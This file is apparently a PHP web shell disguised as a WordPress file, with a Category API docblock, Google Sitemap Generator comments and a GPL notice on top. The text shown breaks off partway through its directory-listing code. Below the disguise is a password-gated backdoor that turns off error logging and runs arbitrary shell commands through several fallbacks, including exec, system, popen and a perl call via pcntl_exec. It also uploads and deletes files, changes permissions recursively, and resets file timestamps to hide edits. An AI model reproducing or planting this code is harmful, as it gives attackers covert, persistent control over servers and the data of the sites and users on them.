<?php

/**
 * WordPress Category API
 *
 * @package WordPress
 */

/**
 * Retrieves all category IDs.
 *
 * @since 2.0.0
 * @link http://codex.wordpress.org/Function_Reference/get_all_category_ids
 *
 * @return object List of all of the category IDs.
 */
 
/*
This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
*/

/**
 * Loader class for the Google Sitemap Generator
 *
 * This class takes care of the sitemap plugin and tries to load the different parts as late as possible.
 * On normal requests, only this small class is loaded. When the sitemap needs to be rebuild, the generator itself is loaded.
 * The last stage is the user interface which is loaded when the administration page is requested.
 */
 
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
$pas1="7be885ab580716";
$pas2="de943d730510e173ae";
$pas_s = $pas1.$pas2;
function ASGLogin() {
    die("<pre align=center><form method=post><input type=password name=pas_s><input type=submit value='>>'></form></pre>");
}
if(!empty($pas_s)) {
    if(isset($_POST['pas_s']) && (md5($_POST['pas_s']) == $pas_s))
        ASGsetcookie(md5($_SERVER['HTTP_HOST']), $pas_s);

    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $pas_s))
        ASGLogin();
}
function ASGsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}

$ip = $_SERVER['REMOTE_ADDR'];

@ob_start();
@ob_implicit_flush(0);

function which($which) {
    $locate = asgexec('which '.$which);
    if($locate) { 
        return $locate;
    } else { 
        return false;
    }
}

function save_file($file, $content) {
    global $win;
    if(!file_exists($file)) {
        return false;
    }
    clearstatcache();
    $filetime = filemtime($file);
    if(!is_writable($file)) {
        $fileperm = substr(decoct(fileperms($file)), -4, 4);
        @chmod($file, intval(0777,8));
        if(!is_writable($file)) {
            return false;
        }
    }
    $handle = @fopen($file, 'w');
    if($handle === FALSE) {
        return false;
    }
    fwrite($handle, $content);
    fclose($handle);
    @touch($file, $filetime, $filetime);
    if(isset($fileperm) && !empty($fileperm)) {
        @chmod($file, intval($fileperm,8));
    }
    clearstatcache();
    return true;
}
function ASGshexit() {
    onphpshutdown();
    exit;
}
function RecursFile($dir) {
    $files = array();
    if(substr($dir, -1) != DIRECTORY_SEPARATOR) {
        $dir .= DIRECTORY_SEPARATOR;
    }
    if(!file_exists($dir)) {
        return false;
    }
    clearstatcache(); // Г—ГЁГ±ГІГЁГ¬ ГЄГҐГё
    $realpath = getcwd(); // Г‘Г®ГµГ°Г Г­ГїГҐГ¬ ГІГҐГЄГіГ№ГЁГ© ГЇГіГІГј
    $handle = @opendir($dir);
    if(FALSE === $handle) {
        return false;
    }
    chdir($dir);
    while(FALSE !== ($file = readdir($handle))) {
        if('.' != $file && '..' != $file ) {
            if(is_dir($file)) {
                $recurs = RecursFile($dir.DIRECTORY_SEPARATOR.$file.DIRECTORY_SEPARATOR);
                if(is_array($recurs)) {
                    $files = array_merge($files, $recurs);
                }
            } elseif(is_file($file)) {
                $files[] = str_replace(array('\\\\', '//'), DIRECTORY_SEPARATOR, $dir.DIRECTORY_SEPARATOR.$file);
            }
        }
    }
    closedir($handle);
    chdir($realpath);
    clearstatcache(); 

    return $files;
}


function RecursDir($dir) {
    $dirs = array();

    if(substr($dir, -1) != DIRECTORY_SEPARATOR) {
        $dir .= DIRECTORY_SEPARATOR;
    }
    if(!file_exists($dir)) {
        return false;
    }
    clearstatcache();
    $realpath = getcwd();
    $handle = @opendir($dir);
    if(FALSE === $handle) {
        return false;
    }
    chdir($dir);
    $dirs[] = str_replace(array('\\\\', '//'), DIRECTORY_SEPARATOR, $dir);
    while(FALSE !== ($file = readdir($handle))) {
        if('.' != $file && '..' != $file ) {
            if(is_dir($file)) {
                $dirs[] = str_replace(array('\\\\', '//'), DIRECTORY_SEPARATOR, $dir.DIRECTORY_SEPARATOR.$file.DIRECTORY_SEPARATOR);
                $recurs = RecursDir($dir.DIRECTORY_SEPARATOR.$file.DIRECTORY_SEPARATOR);
                if(is_array($recurs)) {
                    $dirs = array_merge($dirs, $recurs);
                }
            }
        }
    }
    closedir($handle);
    chdir($realpath);
    clearstatcache();
    $dirs = array_unique($dirs);
    return $dirs;
}

function setRecursPerm($dir, $perm) {
    $good = 0;
    $bad = 0;
    $all = array_merge(RecursFile($dir), RecursDir($dir));
    foreach($all as $file) {
        if(@chmod($file, $perm)) {
            $good++;
        } else {
            $bad++;
        }
    }
    return $good.':'.$bad;
}

$win = strtolower(substr(PHP_OS,0,3)) == "win";
if (get_magic_quotes_gpc()) {if (!function_exists("strips")) {function strips(&$arr,$k="") {if (is_array($arr)) {foreach($arr as $k=>$v) {if (strtoupper($k) != "GLOBALS") {strips($arr["$k"]);}}} else {$arr = stripslashes($arr);}}} strips($GLOBALS);}
$_REQUEST = array_merge($_COOKIE,$_POST);
foreach($_REQUEST as $k=>$v) {if (!isset($$k)) {$$k = $v;}}
$shver = "3.0 BLOG edition";
if (empty($surl)){
    $surl = $_SERVER['PHP_SELF'];
}
$surl = htmlspecialchars($surl);

$curdir = "./";
$tmpdir = "";
$tmpdir_log = "./";

$sort_default = "0a";
$sort_save = TRUE;

$hexdump_lines = 8;
$hexdump_rows = 24;
$nixpwdperpage = 100;

@$f = $_REQUEST["f"];
@extract($_REQUEST["ASGshcook"]);

if (isset($_POST['act'])) $act  = $_POST['act'];
if (isset($_POST['d'])) $d    = urldecode($_POST['d']); else $d=getcwd();
if (isset($_POST['sort'])) $sort = $_POST['sort'];
if (isset($_POST['f'])) $f    = urldecode($_POST['f']);
if (isset($_POST['ft'])) $ft   = $_POST['ft'];
if (isset($_POST['grep'])) $grep = $_POST['grep'];
if (isset($_POST['processes_sort'])) $processes_sort = $_POST['processes_sort'];
if (isset($_POST['pid'])) $pid  = $_POST['pid'];
if (isset($_POST['sig'])) $sig  = $_POST['sig'];
if (isset($_POST['fullhexdump'])) $fullhexdump  = $_POST['fullhexdump'];
if (isset($_POST['c'])) $c  = $_POST['c'];
if (isset($_POST['white'])) $white  = $_POST['white'];
if (isset($_POST['nixpasswd'])) $nixpasswd  = $_POST['nixpasswd'];

$lastdir = @realpath(".");
@chdir($curdir);


function str2mini($content,$len)
{
 if (strlen($content) > $len)
 {
  $len = ceil($len/2) - 2;
  return substr($content, 0,$len)."...".substr($content,-$len);
 }
 else {return $content;}
}

function listdir($start_dir='.') {
  $files = array();
  if (is_dir($start_dir)) {
    $fh = opendir($start_dir);
    while (($file = readdir($fh)) !== false) {
      # loop through the files, skipping . and .., and recursing if necessary
      if (strcmp($file, '.')==0 || strcmp($file, '..')==0) continue;
      $filepath = $start_dir . '/' . $file;
      if ( is_dir($filepath) )
        $files = array_merge($files, listdir($filepath));
      else
        array_push($files, $filepath);
    }
    closedir($fh);
  } else {
    # false if the function was called with an invalid non-directory argument
    $files = false;
  }
 return $files;
}
function view_size($size)
{
 if (!is_numeric($size)) {return FALSE;}
 else
 {
  if ($size >= 1073741824) {$size = round($size/1073741824*100)/100 ." GB";}
  elseif ($size >= 1048576) {$size = round($size/1048576*100)/100 ." MB";}
  elseif ($size >= 1024) {$size = round($size/1024*100)/100 ." KB";}
  else {$size = $size . " B";}
  return $size;
 }
}

function fs_rmdir($d)
{
 $h = opendir($d);
 while (($o = readdir($h)) !== FALSE)
 {
  if (($o != ".") and ($o != ".."))
  {
   if (!is_dir($d.$o)) {unlink($d.$o);}
   else {fs_rmdir($d.$o.DIRECTORY_SEPARATOR); rmdir($d.$o);}
  }
 }
 closedir($h);
 rmdir($d);
 return !is_dir($d);
}

function fs_rmobj($o)
{
 $o = str_replace("\\",DIRECTORY_SEPARATOR,$o);
 if (is_dir($o))
 {
  if (substr($o,-1) != DIRECTORY_SEPARATOR) {$o .= DIRECTORY_SEPARATOR;}
  return fs_rmdir($o);
 }
 elseif (is_file($o)) {return unlink($o);}
 else {return FALSE;}
}

function asgexec($cfe)
{
 $res = '';
 if (!empty($cfe))
 {
  if(@function_exists('exec'))
   {
    @exec($cfe,$res);
    $res = join("\n",$res);
   }
  elseif(@function_exists('shell_exec'))
   {
    $res = @shell_exec($cfe);
   }
  elseif(@function_exists('system'))
   {
    @ob_start();
    @system($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(@function_exists('passthru'))
   {
    @ob_start();
    @passthru($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(@is_resource($f = @popen($cfe,"r")))
  {
   $res = "";
   if(@function_exists('fread') && @function_exists('feof')){
    while(!@feof($f)) { $res .= @fread($f,1024); }
   }else if(@function_exists('fgets') && @function_exists('feof')){
    while(!@feof($f)) { $res .= @fgets($f,1024); }
   }
   @pclose($f);
  }
  elseif(@is_resource($f = @proc_open($cfe,array(1 => array("pipe", "w")),$pipes)))
  {
   $res = "";
   if(@function_exists('fread') && @function_exists('feof')){
    while(!@feof($pipes[1])) {$res .= @fread($pipes[1], 1024);}
   }else if(@function_exists('fgets') && @function_exists('feof')){
    while(!@feof($pipes[1])) {$res .= @fgets($pipes[1], 1024);}
   }
   @proc_close($f);
  }
  elseif(@function_exists('pcntl_exec')&&@function_exists('pcntl_fork'))
   {
    $res = '[~] Blind Command Execution via [pcntl_exec]\n\n';
    $pid = @pcntl_fork();
    if ($pid == -1) {
     $res .= '[-] Could not children fork. ASGshexit';
    } else if ($pid) {
         if (@pcntl_wifexited($status)){$res .= '[+] Done! Command "'.$cfe.'" successfully executed.';}
         else {$res .= '[-] Error. Command incorrect.';}
    } else {
         $cfe = array(" -e 'system(\"$cfe\")'");
         if(@pcntl_exec('/usr/bin/perl',$cfe)) ASGshexit(0);
         if(@pcntl_exec('/usr/local/bin/perl',$cfe)) ASGshexit(0);
         die();
    }
   }
 }
 return $res;
}


function tabsort($a,$b) 
{
    global $v; 
    return strnatcmp($a[$v], $b[$v]);
}

function view_perms($mode)
{
 if (($mode & 0xC000) === 0xC000) {$type = "s";}
 elseif (($mode & 0x4000) === 0x4000) {$type = "d";}
 elseif (($mode & 0xA000) === 0xA000) {$type = "l";}
 elseif (($mode & 0x8000) === 0x8000) {$type = "-";}
 elseif (($mode & 0x6000) === 0x6000) {$type = "b";}
 elseif (($mode & 0x2000) === 0x2000) {$type = "c";}
 elseif (($mode & 0x1000) === 0x1000) {$type = "p";}
 else {$type = "?";}

 $owner["read"] = ($mode & 00400)?"r":"-";
 $owner["write"] = ($mode & 00200)?"w":"-";
 $owner["execute"] = ($mode & 00100)?"x":"-";
 $group["read"] = ($mode & 00040)?"r":"-";
 $group["write"] = ($mode & 00020)?"w":"-";
 $group["execute"] = ($mode & 00010)?"x":"-";
 $world["read"] = ($mode & 00004)?"r":"-";
 $world["write"] = ($mode & 00002)? "w":"-";
 $world["execute"] = ($mode & 00001)?"x":"-";

 if ($mode & 0x800) {$owner["execute"] = ($owner["execute"] == "x")?"s":"S";}
 if ($mode & 0x400) {$group["execute"] = ($group["execute"] == "x")?"s":"S";}
 if ($mode & 0x200) {$world["execute"] = ($world["execute"] == "x")?"t":"T";}

 return $type.join("",$owner).join("",$group).join("",$world);
}

if (!function_exists("posix_getpwuid") and !in_array("posix_getpwuid",$disablefunc)) {function posix_getpwuid($uid) {return FALSE;}}
if (!function_exists("posix_getgrgid") and !in_array("posix_getgrgid",$disablefunc)) {function posix_getgrgid($gid) {return FALSE;}}
if (!function_exists("posix_kill") and !in_array("posix_kill",$disablefunc)) {function posix_kill($gid) {return FALSE;}}
if (!function_exists("parse_perms"))
{
function parse_perms($mode)
{
 if (($mode & 0xC000) === 0xC000) {$t = "s";}
 elseif (($mode & 0x4000) === 0x4000) {$t = "d";}
 elseif (($mode & 0xA000) === 0xA000) {$t = "l";}
 elseif (($mode & 0x8000) === 0x8000) {$t = "-";}
 elseif (($mode & 0x6000) === 0x6000) {$t = "b";}
 elseif (($mode & 0x2000) === 0x2000) {$t = "c";}
 elseif (($mode & 0x1000) === 0x1000) {$t = "p";}
 else {$t = "?";}
 $o["r"] = ($mode & 00400) > 0; $o["w"] = ($mode & 00200) > 0; $o["x"] = ($mode & 00100) > 0;
 $g["r"] = ($mode & 00040) > 0; $g["w"] = ($mode & 00020) > 0; $g["x"] = ($mode & 00010) > 0;
 $w["r"] = ($mode & 00004) > 0; $w["w"] = ($mode & 00002) > 0; $w["x"] = ($mode & 00001) > 0;
 return array("t"=>$t,"o"=>$o,"g"=>$g,"w"=>$w);
}
}

function parsesort($sort)
{
 $one = intval($sort);
 $second = substr($sort,-1);
 if ($second != "d") {$second = "a";}
 return array($one,$second);
}

function view_perms_color($o)
{
 if (!@is_readable($o)) {return "<font color=red>".view_perms(@fileperms($o))."</font>";}
 elseif (!@is_writable($o)) {return "<font color=white>".view_perms(@fileperms($o))."</font>";}
 else {return "<font color=green>".view_perms(@fileperms($o))."</font>";}
}
if(!isset($act)) {$act='';}
if ($act == "gofile") {if (is_dir($f)) {$act = "ls"; $d = $f;} else {$act = "f"; $d = dirname($f); $f = basename($f);}}

header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Last-Modified: ".gmdate("D, d M Y H:i:s")." GMT");
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Cache-Control: post-check=0, pre-check=0", FALSE);
header("Pragma: no-cache");
if (empty($tmpdir))
{
 $tmpdir = ini_get("upload_tmp_dir");
 if (is_dir($tmpdir)) {$tmpdir = "/tmp/";}
}
$tmpdir = realpath($tmpdir);
$tmpdir = str_replace("\\",DIRECTORY_SEPARATOR,$tmpdir);
if (substr($tmpdir,-1) != DIRECTORY_SEPARATOR) {$tmpdir .= DIRECTORY_SEPARATOR;}
if (empty($tmpdir_logs)) {$tmpdir_logs = $tmpdir;}
else {$tmpdir_logs = realpath($tmpdir_logs);}
$sort = @htmlspecialchars($sort);
if (empty($sort)) {$sort = $sort_default;}
$sort[1] = strtolower($sort[1]);
$DISP_SERVER_SOFTWARE = str_replace("PHP/".phpversion(),'',getenv("SERVER_SOFTWARE"));
if (!isset($actbox) || !is_array($actbox)) {$actbox = array();}
$dspact = $act = htmlspecialchars($act);
$disp_fullpath = $ls_arr = $notls = null;
$ud = urlencode($d);
?><html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"><meta http-equiv="Content-Language" content="en-us"><title></title><STYLE>
A { FONT-WEIGHT: normal; COLOR: #FFFFFF; FONT-FAMILY: verdana; TEXT-DECORATION: none;}
A:unknown { FONT-WEIGHT: normal; COLOR: #DDFF55; FONT-FAMILY: verdana; TEXT-DECORATION: none;}
A.Links { TEXT-DECORATION: none;}
A:hover { TEXT-DECORATION: underline;}
.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #555555; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}
textarea{background-color: #555555; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}
button{background-color: #555555; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}
select{background-color: #555555; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}
option {background-color: #555555; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}
iframe {background-color: #555555; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}
p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}
body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}
body { background-color: #010101;}
</style>
</head>
<BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><form name='todo' method='POST'><input name='act' type='hidden' value=''><input name='grep' type='hidden' value=''><input name='fullhexdump' type='hidden' value=''><input name='base64' type='hidden' value=''><input name='nixpasswd' type='hidden' value=''><input name='pid' type='hidden' value=''><input name='c' type='hidden' value=''><input name='white' type='hidden' value=''><input name='wp_act' type='hidden' value=''><input name='wp_path' type='hidden' value='<?php if(isset($wp_path)) echo($wp_path);?>'><input name='sig' type='hidden' value=''><input name='processes_sort' type='hidden' value=''><input name='d' type='hidden' value=''><input name='sort' type='hidden' value=''><input name='f' type='hidden' value=''><input name='ft' type='hidden' value=''></form><center><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2"></center></th></tr>
<tr><td>
<p align="left"><?php
$d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
if (empty($d)) {$d = @realpath(".");} elseif(@realpath($d)) {$d = @realpath($d);}
$d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
$d = str_replace("\\\\","\\",$d);
$dispd = htmlspecialchars($d);
$pd = $e = explode(DIRECTORY_SEPARATOR,substr($d,0,-1));
$i = 0;
foreach($pd as $b)
{
 $t = "";
 $j = 0;
 foreach ($e as $r)
 {
  $t.= $r.DIRECTORY_SEPARATOR;
  if ($j == $i) {break;}
  $j++;
 }
 echo "<a href=\"#\" onclick=\"document.todo.act.value='ls';document.todo.d.value='".urlencode($t)."';document.todo.sort.value='".$sort."';document.todo.submit();\"><b>".htmlspecialchars($b).DIRECTORY_SEPARATOR."</b></a>";
 $i++;
}
echo "&nbsp;&nbsp;&nbsp;";
if (@is_writable($d))
{
 $wd = TRUE;
 $wdt = "<font color=green>[ ok ]</font>";
 echo "<b><font color=green>".view_perms(@fileperms($d))."</font></b>";
}
else
{
 $wd = FALSE;
 $wdt = "<font color=red>[ Read-Only ]</font>";
 echo "<b>".view_perms_color($d)."</b>";
}
echo "<br>";
echo "</p></td></tr></table><br>";
if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\">".$donated_html."</td></tr></table><br>";}
echo "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\">";
if ($act == "") {$act = $dspact = "ls";}

if ($act == "mkdir")
{
 if ($mkdir != $d)
 {
  if (file_exists($mkdir)) {echo "<b>Make Dir \"".htmlspecialchars($mkdir)."\"</b>: object alredy exists";}
  elseif (!mkdir($mkdir)) {echo "<b>Make Dir \"".htmlspecialchars($mkdir)."\"</b>: access denied";}
  echo "<br><br>";
 }
 $act = $dspact = "ls";
}



if ($act == "mkfile")
{
 if ($mkfile != $d)
 {
  if (file_exists($mkfile)) {echo "<b>Make File \"".htmlspecialchars($mkfile)."\"</b>: object alredy exists";}
  elseif (!fopen($mkfile,"w")) {echo "<b>Make File \"".htmlspecialchars($mkfile)."\"</b>: access denied";}
  else {$act = "f"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;} $f = basename($mkfile);}
 }
 else {$act = $dspact = "ls";}
}

if ($act == "chmod")
{
 $mode = fileperms($d.$f);
 if (!$mode) {echo "<b>Change file-mode with error:</b> can't get current value.";}
 else
 {
  $form = TRUE;
  if (isset($chmod_submit))
  {
    if(empty($hand)) {
    $octet = '0'.base_convert((isset($chmod_o["r"])?1:0).(isset($chmod_o["w"])?1:0).(isset($chmod_o["x"])?1:0).(isset($chmod_g["r"])?1:0).(isset($chmod_g["w"])?1:0).(isset($chmod_g["x"])?1:0).(isset($chmod_w["r"])?1:0).(isset($chmod_w["w"])?1:0).(isset($chmod_w["x"])?1:0),2,8);
    } else {
        if(substr($hand,0,1)==0) { $octet = $hand; } else {$octet = '0'.$hand; }

    }
    if(!isset($recurs)) $recurs = 0;
    if(is_dir($d.$f) && $recurs== 1) {
        $result = setRecursPerm($d.$f,intval($octet,8));
        list($good, $bad) = explode(':', $result);
        echo('<b>Result: <font color="green">'.$good.'=> Success</font>, <font color="red">'.$bad.'=>BAD</font><b><br>');
    } else {
        if (@chmod($d.$f,intval($octet,8))) {
            clearstatcache();
            $act = 'ls';
            $form = FALSE;
            $err = '';
        } else {
            $err = 'Can\'t chmod to '.$octet.'.';
        }
    }
  }
  if ($form)
  {
   $perms = parse_perms($mode);
   echo "<b>Changing file-mode (".$d.$f."), ".view_perms_color($d.$f)." (".substr(decoct(fileperms($d.$f)),-4,4).")</b><br>".(isset($err)?"<b>Error:</b> ".$err:"")."<form action=\"".$surl."\" method=POST><input type=hidden name=d value=\"".htmlspecialchars($d)."\"><input type=hidden name=f value=\"".htmlspecialchars($f)."\"><input type=hidden name=act value=chmod><table align=left width=300 border=0 cellspacing=0 cellpadding=5><tr><td><b>Owner</b><br><br><input type=checkbox NAME=chmod_o[r] value=1".($perms["o"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox name=chmod_o[w] value=1".($perms["o"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_o[x] value=1".($perms["o"]["x"]?" checked":"").">eXecute</td><td><b>Group</b><br><br><input type=checkbox NAME=chmod_g[r] value=1".($perms["g"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox NAME=chmod_g[w] value=1".($perms["g"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_g[x] value=1".($perms["g"]["x"]?" checked":"").">eXecute</font></td><td><b>World</b><br><br><input type=checkbox NAME=chmod_w[r] value=1".($perms["w"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox NAME=chmod_w[w] value=1".($perms["w"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_w[x] value=1".($perms["w"]["x"]?" checked":"").">eXecute</font></td></tr><tr><td><input type=text name=hand value=\"\"><br />";
   if(is_dir($d.$f)) {
    echo "<input type=checkbox NAME=recurs value=1 checked=\"checked\"> Use recursive<br>";
   }
   echo "<br><input type=submit name=chmod_submit value=\"Save\"></td></tr></table></form>";
  }
 }
}
if ($act == "upload") {
    $uploadmess = '';
    if(isset($_FILES['uploadfile']) && !empty($_FILES['uploadfile']['tmp_name'])) {
        $uploadpath = $d;
        $destin = $_FILES['uploadfile']["name"];
        if (!move_uploaded_file($_FILES['uploadfile']['tmp_name'],$uploadpath.$destin)) {$uploadmess .= "<font color=red>Error uploading file ".$_FILES['uploadfile']['name']." (can't copy \"".$_FILES['uploadfile']['tmp_name']."\" to \"".$uploadpath.$destin."\"!</font><br>";} else {
            $uploadmess = '<font color=green>File success uploaded</font>';
        }
    }
    echo "<center><b>".$uploadmess."</b></center>";
    $act = 'ls';
}
if ($act == "delete")
{
 $delerr = "";
 foreach ($actbox as $v)
 {
  $result = FALSE;
  $result = fs_rmobj($v);
  if (!$result) {$delerr .= "Can't delete ".htmlspecialchars($v)."<br>";}
 }
 if (!empty($delerr)) {echo "<b>Deleting with errors:</b><br>".$delerr;}
 $act = "ls";
}
if ($act == "cmd")
{
 @chdir($chdir);
 if (!empty($submit))
 {
  echo "<b>Result of execution this command</b>:<br>";
  $olddir = realpath(".");
  @chdir($d);
  $ret = asgexec($cmd);
  $ret = convert_cyr_string($ret,"d","w");
  if ($cmd_txt)
  {
   $rows = count(explode("\r\n",$ret))+1;
   if ($rows < 10) {$rows = 10;}
   echo "<br><textarea cols=\"122\" rows=\"".$rows."\" readonly>".htmlspecialchars($ret)."</textarea>";
  }
  else {echo $ret."<br>";}
  @chdir($olddir);
 }
 else {echo "<b>Execution command</b>"; if (empty($cmd_txt)) {$cmd_txt = TRUE;}}
 echo "<form method=POST><input type=hidden name=act value=cmd><textarea name=cmd cols=122 rows=10>".@htmlspecialchars($cmd)."</textarea><input type=hidden name=\"d\" value=\"".$dispd."\"><br><br><input type=submit name=submit value=\"Execute\">&nbsp;Display in text-area&nbsp;<input type=\"checkbox\" name=\"cmd_txt\" value=\"1\""; if ($cmd_txt) {echo " checked";} echo "></form>";
}
if ($act == "ls")
{
 if (count($ls_arr) > 0) {$list = $ls_arr;}
 else
 {
  $list = array();
  if ($h = @opendir($d))
  {
   while (($o = readdir($h)) !== FALSE) {$list[] = $d.$o;}
   closedir($h);
  }
  else {}
 }
 if (count($list) == 0) {echo "<center><b>Can't open folder (".htmlspecialchars($d).")!</b></center>";}
 else
 {
  //Building array
  $objects = array();
  $vd = "f"; //Viewing mode
  if ($vd == "f")
  {
   $objects["head"] = array();
   $objects["folders"] = array();
   $objects["links"] = array();
   $objects["files"] = array();
   foreach ($list as $v)
   {
    $o = @basename($v);
    $row = array();
    if ($o == ".") {$row[] = $d.$o; $row[] = "LINK";}
    elseif ($o == "..") {$row[] = $d.$o; $row[] = "LINK";}
    elseif (is_dir($v))
    {
     if (@is_link($v)) {$type = "LINK";}
     else {$type = "DIR";}
     $row[] = $v;
     $row[] = $type;
    }
    elseif(@is_file($v)) {$row[] = $v; $row[] = @filesize($v);}
    $row[] = @filemtime($v);
    if (!$win)
    {
     $ow = @posix_getpwuid(@fileowner($v));
     $gr = @posix_getgrgid(@filegroup($v));
     $row[] = ($ow["name"]?$ow["name"]:@fileowner($v))."/".($gr["name"]?$gr["name"]:@filegroup($v));
    }
    $row[] = @fileperms($v);
    if (($o == ".") or ($o == "..")) {$objects["head"][] = $row;}
    elseif (@is_link($v)) {$objects["links"][] = $row;}
    elseif (@is_dir($v)) {$objects["folders"][] = $row;}
    elseif (@is_file($v)) {$objects["files"][] = $row;}
    $i++;
   }
   $row = array();
   $row[] = "<b>Name</b>";
   $row[] = "<b>Size</b>";
   $row[] = "<b>Modify</b>";
   if (!$win)
  {$row[] = "<b>Owner/Group</b>";}
   $row[] = "<b>Perms</b>";
   $row[] = "<b>Action</b>";
   $parsesort = parsesort($sort);
   $sort = $parsesort[0].$parsesort[1];
   $k = $parsesort[0];
   if ($parsesort[1] != "a") {$parsesort[1] = "d";}
   $y = "<a href=\"#\" onclick=\"document.todo.act.value='".$dspact."';document.todo.d.value='".urlencode($d)."';document.todo.sort.value='".$k.($parsesort[1] == "a"?"d":"a").";document.todo.submit();\">";
   $row[$k] .= $y;
   for($i=0;$i<count($row)-1;$i++)
   {
    if ($i != $k) {$row[$i] = "<a href=\"#\" onclick=\"document.todo.act.value='".$dspact."';document.todo.d.value='".urlencode($d)."';document.todo.sort.value='".$i.$parsesort[1]."';document.todo.submit();\">".$row[$i]."</a>";}
   }
   $v = $parsesort[0];
   usort($objects["folders"], "tabsort");
   usort($objects["links"], "tabsort");
   usort($objects["files"], "tabsort");
   if ($parsesort[1] == "d")
   {
    $objects["folders"] = array_reverse($objects["folders"]);
    $objects["files"] = array_reverse($objects["files"]);
   }
   $objects = array_merge($objects["head"],$objects["folders"],$objects["links"],$objects["files"]);
   $tab = array();
   $tab["cols"] = array($row);
   $tab["head"] = array();
   $tab["folders"] = array();
   $tab["links"] = array();
   $tab["files"] = array();
   $i = 0;
   foreach ($objects as $a)
   {
    $v = $a[0];
    $o = basename($v);
    $dir = dirname($v);
    if ($disp_fullpath) {$disppath = $v;}
    else {$disppath = $o;}
    $disppath = str2mini($disppath,60);

    $uo = urlencode($o);
    $ud = urlencode($dir);
    $uv = urlencode($v);
    $row = array();
    if ($o == ".")
    {
     $row[] = "<a href=\"#\" onclick=\"document.todo.act.value='".$dspact."';document.todo.d.value='".urlencode(@realpath($d.$o))."';document.todo.sort.value='".$sort."';document.todo.submit();\">".$o."</a>";
     $row[] = "LINK";
    }
    elseif ($o == "..")
    {
     $row[] = "<a href=\"#\" onclick=\"document.todo.act.value='".$dspact."';document.todo.d.value='".urlencode(@realpath($d.$o))."';document.todo.sort.value='".$sort."';document.todo.submit();\">".$o."</a>";
     $row[] = "LINK";
    }
    elseif (is_dir($v))
    {
     if (is_link($v))
     {
      $disppath .= " => ".readlink($v);
      $type = "LINK";
      $row[] =  "&nbsp;<a href=\"#\" onclick=\"document.todo.act.value='ls';document.todo.d.value='".$uv."';document.todo.sort.value='".$sort."';document.todo.submit();\">[".$disppath."]</a>";         }
     else
     {
      $type = "DIR";
      $row[] =  "&nbsp;<a href=\"#\" onclick=\"document.todo.act.value='ls';document.todo.d.value='".$uv."';document.todo.sort.value='".$sort."';document.todo.submit();\">[".$disppath."]</a>";
     }
     $row[] = $type;
    }
    elseif(is_file($v))
    {
     $row[] =  "&nbsp;<a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.d.value='".$ud."';document.todo.ft.value='edit';document.todo.f.value='".$uo."';document.todo.submit();\">".$disppath."</a>";
     $row[] = view_size($a[1]);
    }
    $row[] = '<a href="#" onclick="document.todo.act.value=\'touch\';document.todo.d.value=\''.$ud.'\';document.todo.f.value=\''.$uo.'\';document.todo.submit();">'.@date("d.m.Y H:i:s",$a[2]).'</a>';
    if (!$win) {$row[] = $a[3];}
     $row[] =  "&nbsp;<a href=\"#\" onclick=\"document.todo.act.value='chmod';document.todo.d.value='".$ud."';document.todo.f.value='".$uo."';document.todo.submit();\"><b>".view_perms_color($v)."</b></a>";
